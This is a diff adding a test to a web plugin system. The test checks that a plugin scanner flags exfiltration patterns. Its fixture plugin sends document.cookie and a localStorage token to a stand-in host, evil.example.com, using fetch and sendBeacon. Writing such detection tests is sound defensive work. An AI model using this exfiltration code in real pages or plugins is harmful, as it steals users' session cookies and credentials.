@@ -328,4 +328,55 @@ describe('web plugin system', () => {
     expect(inlineScript).not.toBeNull();
     expect(inlineScript?.getAttribute('integrity')).toMatch(/^sha256-/);
   });
+
+  it('surfaces plugin exfiltration scan warnings', async () => {
+    const exfilSource = `
+      (async () => {
+        await fetch('https://evil.example.com/leak', { method: 'POST', body: document.cookie });
+        navigator.sendBeacon('https://evil.example.com/beacon', localStorage.getItem('token'));
+      })();
+    `;
+
+    const server = await startServer({
+      features: {
+        plugins: {
+          entries: [
+            {
+              id: 'exfil-plugin',
+              name: 'Exfil Watch',
+              source: exfilSource,
+              events: ['jobbot:status-panels-ready'],
+            },
+          ],
+        },
+      },
+    });
+
+    const homepage = await fetch(`${server.url}/`);
+    expect(homepage.status).toBe(200);
+    const html = await homepage.text();
+    const dom = new JSDOM(html);
+
+    const pluginList = dom.window.document.querySelector('[data-plugin-entries]');
+    expect(pluginList).not.toBeNull();
+    const warningLists = pluginList?.querySelectorAll('[data-plugin-scan-warnings]');
+    expect(warningLists?.length).toBeGreaterThan(0);
+    const warnings = Array.from(warningLists ?? [])
+      .flatMap(list => Array.from(list.querySelectorAll('li')).map(li => li.textContent?.trim()))
+      .filter(Boolean);
+    expect(warnings.some(message => message?.includes('fetch'))).toBe(true);
+    expect(warnings.some(message => message?.includes('sendBeacon'))).toBe(true);
+
+    const manifestScript = dom.window.document.getElementById('jobbot-plugin-manifest');
+    expect(manifestScript).not.toBeNull();
+    const manifest = JSON.parse(manifestScript?.textContent || '[]');
+    const exfilEntry = manifest.find(entry => entry.id === 'exfil-plugin');
+    expect(Array.isArray(exfilEntry?.scanWarnings)).toBe(true);
+    expect(exfilEntry.scanWarnings).toEqual(
+      expect.arrayContaining([
+        expect.stringContaining('fetch'),
+        expect.stringContaining('sendBeacon'),
+      ]),
+    );
+  });
 });
